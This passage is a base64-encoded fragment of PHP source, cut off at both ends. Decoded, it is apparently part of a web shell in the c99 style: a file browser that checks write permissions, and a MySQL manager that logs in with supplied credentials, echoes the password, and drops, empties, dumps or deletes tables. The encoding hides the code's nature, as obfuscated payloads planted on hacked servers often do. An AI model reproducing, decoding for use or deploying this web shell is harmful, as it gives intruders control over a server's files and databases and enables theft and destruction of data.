VtWzFdID0gc3RyX3JlcGxhY2UoIiV1cGQiLHVybGVuY29kZSgkdiksJGl0ZW1bMV0pOwogICAgZWNobyAiPGEgaHJlZj1cIiIuJGl0ZW1bMV0uIlwiPiIuJGl0ZW1bMF0uIjwvYT5cbiI7CiAgfQp9CmVjaG8gIjwvdGQ+PC90cj5cbjx0cj48dGQgY29sc3Bhbj0yPiI7CmVjaG8gIjxwIGNsYXNzPWZsZWZ0PlxuIjsKJHBkID0gJGUgPSBleHBsb2RlKERJUkVDVE9SWV9TRVBBUkFUT1Isc3Vic3RyKCRkLDAsLTEpKTsKJGkgPSAwOwpmb3JlYWNoKCRwZCBhcyAkYikgewogICR0ID0gIiI7ICRqID0gMDsKICBmb3JlYWNoICgkZSBhcyAkcikgewogICAgJHQuPSAkci5ESVJFQ1RPUllfU0VQQVJBVE9SOwogICAgaWYgKCRqID09ICRpKSB7IGJyZWFrOyB9CiAgICAkaisrOwogIH0KICBlY2hvICI8YSBocmVmPVwiIi4kc3VybC4iYWN0PWxzJmQ9Ii51cmxlbmNvZGUoJHQpLiImc29ydD0iLiRzb3J0LiJcIj48Zm9udCBjb2xvcj15ZWxsb3c+Ii5odG1sc3BlY2lhbGNoYXJzKCRiKS5ESVJFQ1RPUllfU0VQQVJBVE9SLiI8L2ZvbnQ+PC9hPlxuIjsKICAkaSsrOwp9CmVjaG8gIiAtICI7CmlmIChpc193cml0YWJsZSgkZCkpIHsKICAkd2QgPSBUUlVFOwogICR3ZHQgPSAiPGZvbnQgY29sb3I9IzAwRkYwMD5bT0tdPC9mb250PiI7CiAgZWNobyAiPGI+PGZvbnQgY29sb3I9Z3JlZW4+Ii52aWV3X3Blcm1zKGZpbGVwZXJtcygkZCkpLiI8L2ZvbnQ+PC9iPiI7Cn0KZWxzZSB7CiAgJHdkID0gRkFMU0U7CiAgJHdkdCA9ICI8Zm9udCBjb2xvcj1yZWQ+W1JlYWQtT25seV08L2ZvbnQ+IjsKICBlY2hvICI8Yj4iLnZpZXdfcGVybXNfY29sb3IoJGQpLiI8L2I+IjsKfQplY2hvICJcbjwvcD5cbiI7Cj8+CjxkaXYgY2xhc3M9ZnJpZ2h0Pgo8Zm9ybSBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdCB2YWx1ZT0ibHMiPgpEaXJlY3Rvcnk6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkIiBzaXplPSI1MCIgdmFsdWU9Ijw/cGhwIGVjaG8gJGRpc3BkOyA/PiI+IDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iR28iPgo8L2Zvcm0+CjwvZGl2Pgo8L3RkPjwvdHI+PC90YWJsZT4KPD9waHAKLyoqKioqKioqKioqKioqKioqKioqKioqLwovKiogSU5GT1JNQVRJT04gVEFCTEUgKiovCi8qKioqKioqKioqKioqKioqKioqKioqKi8KZWNobyAiPHRhYmxlIGlkPW1haW5pbmZvPjx0cj48dGQgd2lkdGg9XCIxMDAlXCI+XG4iOwppZiAoJGFjdCA9PSAiIikgeyAkYWN0ID0gJGRzcGFjdCA9ICJscyI7IH0KaWYgKCRhY3QgPT0gInNxbCIpIHsKICAkc3FsX3N1cmwgPSAkc3VybC4iYWN0PXNxbCI7CiAgaWYgKCRzcWxfbG9naW4pICB7JHNxbF9zdXJsIC49ICImc3FsX2xvZ2luPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX2xvZ2luKTt9CiAgaWYgKCRzcWxfcGFzc3dkKSB7JHNxbF9zdXJsIC49ICImc3FsX3Bhc3N3ZD0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wYXNzd2QpO30KICBpZiAoJHNxbF9zZXJ2ZXIpIHskc3FsX3N1cmwgLj0gIiZzcWxfc2VydmVyPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3NlcnZlcik7fQogIGlmICgkc3FsX3BvcnQpICAgeyRzcWxfc3VybCAuPSAiJnNxbF9wb3J0PSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3BvcnQpO30KICBpZiAoJHNxbF9kYikgICAgIHskc3FsX3N1cmwgLj0gIiZzcWxfZGI9Ii5odG1sc3BlY2lhbGNoYXJzKCRzcWxfZGIpO30KICAkc3FsX3N1cmwgLj0gIiYiOwogIGVjaG8gIjxoND5BdHRlbnRpb24hIE15U1FMIE1hbmFnZXIgaXMgPHU+Tk9UPC91PiBhIHJlYWR5IG1vZHVsZSEgRG9uJ3QgcmVwb3J0cyBidWdzLjwvaDQ+Ii4KICAgICAgICI8dGFibGU+Ii4KICAgICAgICI8dHI+PHRkIHdpZHRoPVwiMTAwJVwiIGNvbHNwYW49MiBjbGFzcz1iYXJoZWFkZXI+IjsKICBpZiAoJHNxbF9zZXJ2ZXIpIHsKICAgICRzcWxfc29jayA9IG15c3FsX2Nvbm5lY3QoJHNxbF9zZXJ2ZXIuIjoiLiRzcWxfcG9ydCwgJHNxbF9sb2dpbiwgJHNxbF9wYXNzd2QpOwogICAgJGVyciA9IG15c3FsX3NtYXJ0ZXJyb3IoKTsKICAgIEBteXNxbF9zZWxlY3RfZGIoJHNxbF9kYiwkc3FsX3NvY2spOwogICAgaWYgKCRzcWxfcXVlcnkgYW5kICRzdWJtaXQpIHskc3FsX3F1ZXJ5X3Jlc3VsdCA9IG15c3FsX3F1ZXJ5KCRzcWxfcXVlcnksJHNxbF9zb2NrKTsgJHNxbF9xdWVyeV9lcnJvciA9IG15c3FsX3NtYXJ0ZXJyb3IoKTt9CiAgfQogIGVsc2UgeyRzcWxfc29jayA9IEZBTFNFO30KICBlY2hvICIuOiBTUUwgTWFuYWdlciA6Ljxicj4iOwogIGlmICghJHNxbF9zb2NrKSB7CiAgICBpZiAoISRzcWxfc2VydmVyKSB7ZWNobyAiTk8gQ09OTkVDVElPTiI7fQogICAgZWxzZSB7ZWNobyAiQ2FuJ3QgY29ubmVjdCEgIi4kZXJyO30KICB9CiAgZWxzZSB7CiAgICAkc3FscXVpY2tsYXVuY2ggPSBhcnJheSgpOwogICAgJHNxbHF1aWNrbGF1bmNoW10gPSBhcnJheSgiSW5kZXgiLCRzdXJsLiJhY3Q9c3FsJnNxbF9sb2dpbj0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9sb2dpbikuIiZzcWxfcGFzc3dkPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3Bhc3N3ZCkuIiZzcWxfc2VydmVyPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3NlcnZlcikuIiZzcWxfcG9ydD0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wb3J0KS4iJiIpOwogICAgJHNxbHF1aWNrbGF1bmNoW10gPSBhcnJheSgiUXVlcnkiLCRzcWxfc3VybC4ic3FsX2FjdD1xdWVyeSZzcWxfdGJsPSIudXJsZW5jb2RlKCRzcWxfdGJsKSk7CiAgICAkc3FscXVpY2tsYXVuY2hbXSA9IGFycmF5KCJTZXJ2ZXItc3RhdHVzIiwkc3VybC4iYWN0PXNxbCZzcWxfbG9naW49Ii5odG1sc3BlY2lhbGNoYXJzKCRzcWxfbG9naW4pLiImc3FsX3Bhc3N3ZD0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wYXNzd2QpLiImc3FsX3NlcnZlcj0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9zZXJ2ZXIpLiImc3FsX3BvcnQ9Ii5odG1sc3BlY2lhbGNoYXJzKCRzcWxfcG9ydCkuIiZzcWxfYWN0PXNlcnZlcnN0YXR1cyIpOwogICAgJHNxbHF1aWNrbGF1bmNoW10gPSBhcnJheSgiU2VydmVyIHZhcmlhYmxlcyIsJHN1cmwuImFjdD1zcWwmc3FsX2xvZ2luPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX2xvZ2luKS4iJnNxbF9wYXNzd2Q9Ii5odG1sc3BlY2lhbGNoYXJzKCRzcWxfcGFzc3dkKS4iJnNxbF9zZXJ2ZXI9Ii5odG1sc3BlY2lhbGNoYXJzKCRzcWxfc2VydmVyKS4iJnNxbF9wb3J0PSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3BvcnQpLiImc3FsX2FjdD1zZXJ2ZXJ2YXJzIik7CiAgICAkc3FscXVpY2tsYXVuY2hbXSA9IGFycmF5KCJQcm9jZXNzZXMiLCRzdXJsLiJhY3Q9c3FsJnNxbF9sb2dpbj0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9sb2dpbikuIiZzcWxfcGFzc3dkPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3Bhc3N3ZCkuIiZzcWxfc2VydmVyPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3NlcnZlcikuIiZzcWxfcG9ydD0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wb3J0KS4iJnNxbF9hY3Q9cHJvY2Vzc2VzIik7CiAgICAkc3FscXVpY2tsYXVuY2hbXSA9IGFycmF5KCJMb2dvdXQiLCRzdXJsLiJhY3Q9c3FsIik7CiAgICBlY2hvICJNeVNRTCAiLm15c3FsX2dldF9zZXJ2ZXJfaW5mbygpLiIgKHByb3RvIHYuIi5teXNxbF9nZXRfcHJvdG9faW5mbyAoKS4iKSBydW5uaW5nIGluICIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3NlcnZlcikuIjoiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wb3J0KS4iIGFzICIuaHRtbHNwZWNpYWxjaGFycygkc3FsX2xvZ2luKS4iQCIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3NlcnZlcikuIiAocGFzc3dvcmQgLSBcIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3Bhc3N3ZCkuIlwiKTxicj4iOwogICAgaWYgKGNvdW50KCRzcWxxdWlja2xhdW5jaCkgPiAwKSB7Zm9yZWFjaCgkc3FscXVpY2tsYXVuY2ggYXMgJGl0ZW0pIHtlY2hvICJbIDxhIGhyZWY9XCIiLiRpdGVtWzFdLiJcIj4iLiRpdGVtWzBdLiI8L2E+IF0gIjt9fQogIH0KICBlY2hvICI8L3RkPjwvdHI+PHRyPiI7CiAgaWYgKCEkc3FsX3NvY2spIHsKICAgIGVjaG8gIjx0ZCB3aWR0aD1cIjI4JVwiIGhlaWdodD1cIjEwMFwiIHZhbGlnbj1cInRvcFwiPjxsaT5JZiBsb2dpbiBpcyBudWxsLCBsb2dpbiBpcyBvd25lciBvZiBwcm9jZXNzLjxsaT5JZiBob3N0IGlzIG51bGwsIGhvc3QgaXMgbG9jYWxob3N0PC9iPjxsaT5JZiBwb3J0IGlzIG51bGwsIHBvcnQgaXMgMzMwNiAoZGVmYXVsdCk8L3RkPjx0ZCB3aWR0aD1cIjkwJVwiIGhlaWdodD0xIHZhbGlnbj1cInRvcFwiPiI7CiAgICBlY2hvICI8dGFibGUgd2lkdGg9XCIxMDAlXCIgYm9yZGVyPTA+PHRyPjx0ZD48Yj5QbGVhc2UsIGZpbGwgdGhlIGZvcm06PC9iPjx0YWJsZT48dHI+PHRkPjxiPlVzZXJuYW1lPC9iPjwvdGQ+PHRkPjxiPlBhc3N3b3JkPC9iPjwvdGQ+PHRkPjxiPkRhdGFiYXNlPC9iPjwvdGQ+PC90cj48Zm9ybSBhY3Rpb249XCIgJHN1cmwgXCIgbWV0aG9kPVwiUE9TVFwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cImFjdFwiIHZhbHVlPVwic3FsXCI+PHRyPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwic3FsX2xvZ2luXCIgdmFsdWU9XCJyb290XCIgbWF4bGVuZ3RoPVwiNjRcIj48L3RkPjx0ZD48aW5wdXQgdHlwZT1cInBhc3N3b3JkXCIgbmFtZT1cInNxbF9wYXNzd2RcIiB2YWx1ZT1cIlwiIG1heGxlbmd0aD1cIjY0XCI+PC90ZD48dGQ+PGlucHV0IHR5cGU9XCJ0ZXh0XCIgbmFtZT1cInNxbF9kYlwiIHZhbHVlPVwiXCIgbWF4bGVuZ3RoPVwiNjRcIj48L3RkPjwvdHI+PHRyPjx0ZD48Yj5Ib3N0PC9iPjwvdGQ+PHRkPjxiPlBPUlQ8L2I+PC90ZD48L3RyPjx0cj48dGQgYWxpZ249cmlnaHQ+PGlucHV0IHR5cGU9XCJ0ZXh0XCIgbmFtZT1cInNxbF9zZXJ2ZXJcIiB2YWx1ZT1cImxvY2FsaG9zdFwiIG1heGxlbmd0aD1cIjY0XCI+PC90ZD48dGQ+PGlucHV0IHR5cGU9XCJ0ZXh0XCIgbmFtZT1cInNxbF9wb3J0XCIgdmFsdWU9XCIzMzA2XCIgbWF4bGVuZ3RoPVwiNlwiIHNpemU9XCIzXCI+PC90ZD48dGQ+PGlucHV0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIkNvbm5lY3RcIj48L3RkPjwvdHI+PHRyPjx0ZD48L3RkPjwvdHI+PC9mb3JtPjwvdGFibGU+PC90ZD4iOwogIH0KICBlbHNlIHsKICAgIC8vU3RhcnQgbGVmdCBwYW5lbAogICAgaWYgKCFlbXB0eSgkc3FsX2RiKSkgewogICAgICA/Pjx0ZCB3aWR0aD0iMjUlIiBoZWlnaHQ9IjEwMCUiIHZhbGlnbj0idG9wIj48YSBocmVmPSI8P3BocCBlY2hvICRzdXJsLiJhY3Q9c3FsJnNxbF9sb2dpbj0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9sb2dpbikuIiZzcWxfcGFzc3dkPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3Bhc3N3ZCkuIiZzcWxfc2VydmVyPSIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3NlcnZlcikuIiZzcWxfcG9ydD0iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9wb3J0KS4iJiI7ID8+Ij48Yj5Ib21lPC9iPjwvYT48aHIgc2l6ZT0iMSIgbm9zaGFkZT4KICAgICAgPD9waHAKICAgICAgJHJlc3VsdCA9IG15c3FsX2xpc3RfdGFibGVzKCRzcWxfZGIpOwogICAgICBpZiAoISRyZXN1bHQpIHtlY2hvIG15c3FsX3NtYXJ0ZXJyb3IoKTt9CiAgICAgIGVsc2UgewogICAgICAgIGVjaG8gIi0tLVsgPGEgaHJlZj1cIiIuJHNxbF9zdXJsLiImXCI+PGI+Ii5odG1sc3BlY2lhbGNoYXJzKCRzcWxfZGIpLiI8L2I+PC9hPiBdLS0tPGJyPiI7CiAgICAgICAgJGMgPSAwOwogICAgICAgIHdoaWxlICgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkpIHskY291bnQgPSBteXNxbF9xdWVyeSAoIlNFTEVDVCBDT1VOVCgqKSBGUk9NICIuJHJvd1swXSk7ICRjb3VudF9yb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkY291bnQpOyBlY2hvICI8Yj4rJm5ic3A7PGEgaHJlZj1cIiIuJHNxbF9zdXJsLiJzcWxfZGI9Ii5odG1sc3BlY2lhbGNoYXJzKCRzcWxfZGIpLiImc3FsX3RibD0iLmh0bWxzcGVjaWFsY2hhcnMoJHJvd1swXSkuIlwiPjxiPiIuaHRtbHNwZWNpYWxjaGFycygkcm93WzBdKS4iPC9iPjwvYT4gKCIuJGNvdW50X3Jvd1swXS4iKTwvYnI+PC9iPiI7IG15c3FsX2ZyZWVfcmVzdWx0KCRjb3VudCk7ICRjKys7fQogICAgICAgIGlmICghJGMpIHtlY2hvICJObyB0YWJsZXMgZm91bmQgaW4gZGF0YWJhc2UuIjt9CiAgICAgIH0KICAgIH0KICAgIGVsc2UgewogICAgICA/Pjx0ZCB3aWR0aD0iMSIgaGVpZ2h0PSIxMDAiIHZhbGlnbj0idG9wIj48YSBocmVmPSI8P3BocCBlY2hvICRzcWxfc3VybDsgPz4iPjxiPkhvbWU8L2I+PC9hPjxociBzaXplPSIxIiBub3NoYWRlPgogICAgICA8P3BocAogICAgICAkcmVzdWx0ID0gbXlzcWxfbGlzdF9kYnMoJHNxbF9zb2NrKTsKICAgICAgaWYgKCEkcmVzdWx0KSB7ZWNobyBteXNxbF9zbWFydGVycm9yKCk7fQogICAgICBlbHNlIHsKICAgICAgICA/Pjxmb3JtIGFjdGlvbj0iPD9waHAgZWNobyAkc3VybDsgPz4iPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdCIgdmFsdWU9InNxbCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX2xvZ2luIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfbG9naW4pOyA/PiI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3FsX3Bhc3N3ZCIgdmFsdWU9Ijw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkc3FsX3Bhc3N3ZCk7ID8+Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzcWxfc2VydmVyIiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfc2VydmVyKTsgPz4iPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InNxbF9wb3J0IiB2YWx1ZT0iPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzcWxfcG9ydCk7ID8+Ij48c2VsZWN0IG5hbWU9InNxbF9kYiI+CiAgICAgICAgPD9waHAKICAgICAgICAkYyA9IDA7CiAgICAgICAgJGRicyA9ICIiOwogICAgICAgIHdoaWxlICgkcm93ID0gbXlzcWxfZmV0Y2hfcm93KCRyZXN1bHQpKSB7JGRicyAuPSAiPG9wdGlvbiB2YWx1ZT1cIiIuJHJvd1swXS4iXCIiOyBpZiAoJHNxbF9kYiA9PSAkcm93WzBdKSB7JGRicyAuPSAiIHNlbGVjdGVkIjt9ICRkYnMgLj0gIj4iLiRyb3dbMF0uIjwvb3B0aW9uPiI7ICRjKys7fQogICAgICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9XCJcIj5EYXRhYmFzZXMgKCIuJGMuIik8L29wdGlvbj4iOwogICAgICAgIGVjaG8gJGRiczsKICAgICAgfQogICAgICA/Pjwvc2VsZWN0PjxociBzaXplPSIxIiBub3NoYWRlPlBsZWFzZSwgc2VsZWN0IGRhdGFiYXNlPGhyIHNpemU9IjEiIG5vc2hhZGU+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIj48L2Zvcm0+CiAgICAgIDw/cGhwCiAgICB9CiAgICAvL0VuZCBsZWZ0IHBhbmVsCiAgICBlY2hvICI8L3RkPjx0ZCB3aWR0aD1cIjEwMCVcIj4iOwogICAgLy9TdGFydCBjZW50ZXIgcGFuZWwKICAgICRkaXBsYXkgPSBUUlVFOwogICAgaWYgKCRzcWxfZGIpIHsKICAgICAgaWYgKCFpc19udW1lcmljKCRjKSkgeyRjID0gMDt9CiAgICAgIGlmICgkYyA9PSAwKSB7JGMgPSAibm8iO30KICAgICAgZWNobyAiPGhyIHNpemU9XCIxXCIgbm9zaGFkZT48Y2VudGVyPjxiPlRoZXJlIGFyZSAiLiRjLiIgdGFibGUocykgaW4gdGhpcyBEQiAoIi5odG1sc3BlY2lhbGNoYXJzKCRzcWxfZGIpLiIpLjxicj4iOwogICAgICBpZiAoY291bnQoJGRicXVpY2tsYXVuY2gpID4gMCkge2ZvcmVhY2goJGRic3FscXVpY2tsYXVuY2ggYXMgJGl0ZW0pIHtlY2hvICJbIDxhIGhyZWY9XCIiLiRpdGVtWzFdLiJcIj4iLiRpdGVtWzBdLiI8L2E+IF0gIjt9fQogICAgICBlY2hvICI8L2I+PC9jZW50ZXI+IjsKICAgICAgJGFjdHMgPSBhcnJheSgiIiwiZHVtcCIpOwogICAgICBpZiAoJHNxbF9hY3QgPT0gInRibGRyb3AiKSB7JHNxbF9xdWVyeSA9ICJEUk9QIFRBQkxFIjsgZm9yZWFjaCgkYm94dGJsIGFzICR2KSB7JHNxbF9xdWVyeSAuPSAiXG5gIi4kdi4iYCAsIjt9ICRzcWxfcXVlcnkgPSBzdWJzdHIoJHNxbF9xdWVyeSwwLC0xKS4iOyI7ICRzcWxfYWN0ID0gInF1ZXJ5Ijt9CiAgICAgIGVsc2VpZiAoJHNxbF9hY3QgPT0gInRibGVtcHR5IikgeyRzcWxfcXVlcnkgPSAiIjsgZm9yZWFjaCgkYm94dGJsIGFzICR2KSB7JHNxbF9xdWVyeSAuPSAiREVMRVRFIEZST00gYCIuJHYuImAgXG4iO30gJHNxbF9hY3QgPSAicXVlcnkiO30KICAgICAgZWxzZWlmICgkc3FsX2FjdCA9PSAidGJsZHVtcCIpIHtpZiAoY291bnQoJGJveHRibCkgPiAwKSB7JGRtcHRibHMgPSAkYm94dGJsO30gZWxzZWlmKCR0aGlzdGJsKSB7JGRtcHRibHMgPSBhcnJheSgkc3FsX3RibCk7fSAkc3FsX2FjdCA9ICJkdW1wIjt9CiAgICAgIGVsc2VpZiAoJHNxbF9hY3QgPT0gInRibGNoZWNrIikgeyRzcWxfcXVlcnkgPSAiQ0hFQ0sgVEFCTEUiOyBmb3JlYWNoKCRib3h0YmwgYXMgJHYpIHskc3FsX3F1ZXJ5IC49ICJcbmAiLiR2LiJgICwiO30gJHNxbF9xdWVyeSA9IHN1YnN0cigkc3FsX3F1ZXJ5LDAsLTEpLiI7IjsgJHNxbF9hY3QgPSAicXVlcnkiO30KICAgICAgZWxzZWlmICgkc3FsX2FjdCA9PSAidGJsb3B0aW1pemUiKSB7JHNxbF9xdWVyeSA9ICJPUFRJTUlaRSBUQUJMRSI7IGZvcmVhY2goJGJveHRibCBhcyAkdikgeyRzcWxfcXVlcnkgLj0gIlxuYCIuJHYuImAgLCI7fSAkc3FsX3F1ZXJ5ID0gc3Vic3RyKCRzcWxfcXVlcnksMCwtMSkuIjsiOyAkc3FsX2FjdCA9ICJxdWVyeSI7fQogICAgICBlbHNlaWYgKCRzcWxfYWN0ID09ICJ0YmxyZXBhaXIiKSB7JHNxbF9xdWVyeSA9ICJSRVBBSVIgVEFCTEUiOyBmb3JlYWNoKCRib3h0YmwgYXMgJHYpIHskc3FsX3F1ZXJ5IC49ICJcbmAiLiR2LiJgICwiO30gJHNxbF9xdWVyeSA9IHN1YnN0cigkc3FsX3F1ZXJ5LDAsLTEpLiI7IjsgJHNxbF9hY3QgPSAicXVlcnkiO30KICAgICAgZWxzZWlmICgkc3FsX2FjdCA9PSAidGJsYW5hbHl6ZSIpIHskc3FsX3F1ZXJ5ID0gIkFOQUxZWkUgVEFCTEUiOyBmb3JlYWNoKCRib3h0YmwgYXMgJHYpIHskc3FsX3F1ZXJ5IC49ICJcbmAiLiR2LiJgICwiO30gJHNxbF9xdWVyeSA9IHN1YnN0cigkc3FsX3F1ZXJ5LDAsLTEpLiI7IjsgJHNxbF9hY3QgPSAicXVlcnkiO30KICAgICAgZWxzZWlmICgkc3FsX2FjdCA9PSAiZGVsZXRlcm93IikgeyRzcWxfcXVlcnkgPSAiIjsgaWYgKCFlbXB0eSgkYm94cm93X2FsbCkpIHskc3FsX3F1ZXJ5ID0gIkRFTEVURSAqIEZST00gYCIuJHNxbF90YmwuImA7Ijt9IGVsc2Uge2ZvcmVhY2goJGJveHJvdyBhcyAkdikgeyRzcWxfcXVlcnkgLj0gIkRFTEVURSAqIEZST00gYCIuJHNxbF90YmwuImAgV0hFUkUiLiR2LiIgTElNSVQgMTtcbiI7fSAkc3FsX3F1ZXJ5ID0gc3Vic3RyKCRzcWxfcXVlcnksMCwtMSk7fSAkc3FsX2FjdCA9ICJxdWVyeSI7fQogICAgICBlbHNlaWYgKCRzcWxfdGJsX2FjdCA9PSAiaW5zZXJ0IikgewogICAgICAgIGlmICgkc3FsX3RibF9pbnNlcnRfcmFkaW8gPT0gMSkgewogICAgICAgICAgJGtleXMgPSAiIjsKICAgICAgICAgICRha2V5cyA9IGFycmF5X2tleXMoJHNxbF90YmxfaW5zZXJ0KTsKICAgICAgICAgIGZvcmVhY2ggKCRha2V5cyBhcyAkdikgeyRrZXlzIC49ICJgIi5hZGRzbGFzaGVzKCR2KS4iYCwgIjt9CiAgICAgICAgICBpZiAoIWVtcHR5KCRrZXlzKSkgeyRrZXlzID0gc3Vic3RyKCRrZXlzLDAsc3RybGVuKCRrZXlzKS0yKTt9CiAgICAgICAgICAkdmFsdWVzID0gIiI7CiAgICAgICAgICAkaSA9IDA7CiAgICAgICAgICBmb3JlYWNoIChhcnJheV92YWx1ZXMoJHNxbF90YmxfaW5zZXJ0KSBhcyAkdikge2lmICgkZnVuY3QgPSAkc3FsX3RibF9pbnNlcnRfZnVuY3RzWyRha2V5c1skaV1dKSB7JHZhbHVlcyAuPSAkZnVuY3QuIiAoIjt9ICR2YWx1ZXMgLj0gIiciLmFkZHNsYXNoZXMoJHYpLiInIjsgaWYgKCRmdW5jdCkgeyR2YWx1ZXMgLj0gIikiO30gJHZhbHVlcyAuPSAiLCAiOyAkaSsrO30KICAgICAgICAgIGlmICghZW1wdHkoJHZhbHVlcykpIHskdmFsdWVzID0gc3Vic3RyKCR2YWx1ZXMsMCxzdHJsZW4oJHZhbHVlcyktMik7fQogICAgICAgICAgJHNxbF9xdWVyeSA9ICJJTlNFUlQgSU5UTyBgIi4kc3FsX3RibC4iYCAoICIuJGtleXMuIiApIFZBTFVFUyAoICIuJHZhbHVlcy4iICk7IjsKICAgICAgICAgICRzcWxfYWN0ID0gInF1ZXJ5IjsKICAgICAgICAgICRzcWxfdGJsX2FjdCA9ICJicm93c2UiOwogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRzcWxfdGJsX2luc2VydF9yYWRpbyA9PSAyKSB7CiAgICAgICAgICAkc2V0ID0gbXlzcWxfYnVpbGR3aGVyZSgkc3FsX3RibF9pbnNlcnQsIiwgIiwkc3FsX3RibF9pbnNlcnRfZnVuY3RzKTsKICAgICAgICAgICRzcWxfcXVlcnkgPSAiVVBEQVRFIGAiLiRzcWxfdGJsLiJgIFNFVCAiLiRzZXQuIiBXSEVSRSAiLiRzcWxfdGJsX2luc2VydF9xLiIgTElNSVQgMTsiOwogICAgICAgICAgJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCRzcWxfcXVlcnkpIG9yIHByaW50KG15c3FsX3NtYXJ0ZXJyb3IoKSk7CiAgICAgICAgICAkcmVzdWx0ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCwgTVlTUUxfQVNTT0MpOwogICAgICAgICAgJHNxbF9hY3QgPSAicXVlcnkiOwogICAgICAgICAgJHNxbF90YmxfYWN0ID0gImJyb3dzZSI7CiAgICAgICAgfQogICAgICB9CiAgICAgIGlmICgkc3FsX2FjdCA9PSAicXVlcnkiKSB7CiAgICAgICAgZWNobyAiPGhyIHNpemU9XCIxXCIgbm9zaGFkZT4iOwogICAgICAgIGlmICgoJHN1Ym1pdCkgYW5kICghJHNxbF9xdWVyeV9yZXN1bHQpIGFuZCAoJHNxbF9jb25maXJtKSkge2lmICghJHNxbF9xdWVyeV9lcnJvcikgeyRzcWxfcXVlcnlfZXJyb3IgPSAiUXVlcnkgd2FzIGVtcHR5Ijt9IGVjaG8gIjxiPkVycm9yOjwvYj4gPGJyPiIuJHNxbF9xdWVyeV9lcnJvci4iPGJyPiI7fQogICAgICAgIGlmICgkc3FsX3F1ZXJ5X3Jlc3VsdCBvciAoISRzcWxfY29uZmlybSkpIHskc3FsX2FjdCA9ICRzcWxfZ290bzt9CiAgICAgICAgaWYgKCghJHN1Ym1pdCkgb3IgKCRzcWxfYWN0KSkge2VjaG8gIjx0YWJsZSBib3JkZXI9XCIwXCIgd2lkdGg9XCIxMDAlXCIgaGVpZ2h0PVwiMVwiPjx0cj48dGQ+PGZvcm0gYWN0aW9uPVwiIi4kc3FsX3N1cmwuIlwiIG1ldGhvZD1cIlBPU1RcIj48Yj4iOyBpZiAoKCRzcWxfcXVlcnkpIGFuZCAoISRzdWJtaXQpKSB7ZWNobyAiRG8geW91IHJlYWxseSB3YW50IHRvOiI7fSBlbHNlIHtlY2hvICJTUUwtUXVlcnkgOiI7fSBlY2hvICI8L2I+PGJyPjxicj48dGV4dGFyZWEgbmFtZT1cInNxbF9xdWVyeVwiIGNvbHM9XCIxMDBcIiByb3dzPVwiMTBcIj4iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9xdWVyeSkuIjwvdGV4dGFyZWE+PGJyPjxicj48aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJzcWxfYWN0XCIgdmFsdWU9XCJxdWVyeVwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInNxbF90YmxcIiB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3RibCkuIlwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInN1Ym1pdFwiIHZhbHVlPVwiMVwiPjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInNxbF9nb3RvXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9nb3RvKS4iXCI+PGlucHV0IHR5cGU9XCJzdWJtaXRcIiBuYW1lPVwic3FsX2NvbmZpcm1cIiB2YWx1ZT1cIlllc1wiPiA8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwiTm9cIj48L2Zvcm0+PC90ZD48L3RyPjwvdGFibGU+Ijt9CiAgICAgIH0KICAgICAgaWYgKGluX2FycmF5KCRzcWxfYWN0LCRhY3RzKSkgewogICAgICAgID8+PHRhYmxlIGJvcmRlcj0iMCIgd2lkd